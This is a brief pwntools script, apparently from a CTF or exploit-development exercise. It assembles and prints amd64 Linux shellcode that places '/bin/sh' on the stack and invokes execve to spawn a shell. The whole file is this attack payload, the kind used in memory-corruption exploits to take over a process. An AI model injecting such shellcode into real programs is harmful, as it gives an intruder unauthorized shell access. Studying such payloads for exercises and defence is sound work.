#!/usr/bin/env python

from pwn import *

context.update(arch="amd64", os="linux")

shellcode = '''
xor     rdx, rdx
mov     rbx, 0x68732f6e69622f2f
shr     rbx, 0x8
push    rbx
mov     rdi, rsp
push    rax
push    rdi
mov     rsi, rsp
mov     al, 0x3b
syscall
'''

print(shellcode+'\n')
print(asm(shellcode))
